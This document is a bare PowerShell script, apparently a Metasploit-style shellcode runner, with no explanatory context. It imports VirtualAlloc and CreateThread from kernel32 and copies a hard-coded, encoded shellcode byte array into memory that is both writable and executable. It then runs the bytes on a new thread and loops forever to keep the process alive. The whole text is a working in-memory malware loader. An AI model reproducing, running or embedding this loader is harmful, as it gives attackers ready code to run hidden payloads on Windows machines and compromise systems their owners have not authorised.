
$uff = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $uff -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xba,0x94,0x7a,0x99,0x2d,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x55,0x18,0x83,0xed,0xfc,0x03,0x55,0x80,0x98,0x6c,0xd1,0x40,0xde,0x8f,0x2a,0x90,0xbf,0x06,0xcf,0xa1,0xff,0x7d,0x9b,0x91,0xcf,0xf6,0xc9,0x1d,0xbb,0x5b,0xfa,0x96,0xc9,0x73,0x0d,0x1f,0x67,0xa2,0x20,0xa0,0xd4,0x96,0x23,0x22,0x27,0xcb,0x83,0x1b,0xe8,0x1e,0xc5,0x5c,0x15,0xd2,0x97,0x35,0x51,0x41,0x08,0x32,0x2f,0x5a,0xa3,0x08,0xa1,0xda,0x50,0xd8,0xc0,0xcb,0xc6,0x53,0x9b,0xcb,0xe9,0xb0,0x97,0x45,0xf2,0xd5,0x92,0x1c,0x89,0x2d,0x68,0x9f,0x5b,0x7c,0x91,0x0c,0xa2,0xb1,0x60,0x4c,0xe2,0x75,0x9b,0x3b,0x1a,0x86,0x26,0x3c,0xd9,0xf5,0xfc,0xc9,0xfa,0x5d,0x76,0x69,0x27,0x5c,0x5b,0xec,0xac,0x52,0x10,0x7a,0xea,0x76,0xa7,0xaf,0x80,0x82,0x2c,0x4e,0x47,0x03,0x76,0x75,0x43,0x48,0x2c,0x14,0xd2,0x34,0x83,0x29,0x04,0x97,0x7c,0x8c,0x4e,0x35,0x68,0xbd,0x0c,0x51,0x5d,0x8c,0xae,0xa1,0xc9,0x87,0xdd,0x93,0x56,0x3c,0x4a,0x9f,0x1f,0x9a,0x8d,0xe0,0x35,0x5a,0x01,0x1f,0xb6,0x9b,0x0b,0xdb,0xe2,0xcb,0x23,0xca,0x8a,0x87,0xb3,0xf3,0x5e,0x3d,0xb1,0x63,0xa1,0x6a,0xcd,0xf2,0x49,0x69,0x2e,0xf5,0x32,0xe4,0xc8,0xa5,0x14,0xa7,0x44,0x05,0xc5,0x07,0x35,0xed,0x0f,0x88,0x6a,0x0d,0x30,0x42,0x03,0xa7,0xdf,0x3b,0x7b,0x5f,0x79,0x66,0xf7,0xfe,0x86,0xbc,0x7d,0xc0,0x0d,0x33,0x81,0x8e,0xe5,0x3e,0x91,0x66,0x06,0x75,0xcb,0x20,0x19,0xa3,0x66,0xcc,0x8f,0x48,0x21,0x9b,0x27,0x53,0x14,0xeb,0xe7,0xac,0x73,0x60,0x21,0x39,0x3c,0x1e,0x4e,0xad,0xbc,0xde,0x18,0xa7,0xbc,0xb6,0xfc,0x93,0xee,0xa3,0x02,0x0e,0x83,0x78,0x97,0xb1,0xf2,0x2d,0x30,0xda,0xf8,0x08,0x76,0x45,0x02,0x7f,0x86,0xb9,0xd5,0xb9,0xfc,0xd3,0xe5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$YCG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($YCG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$YCG,0,0,0);for (;;){Start-sleep 60};

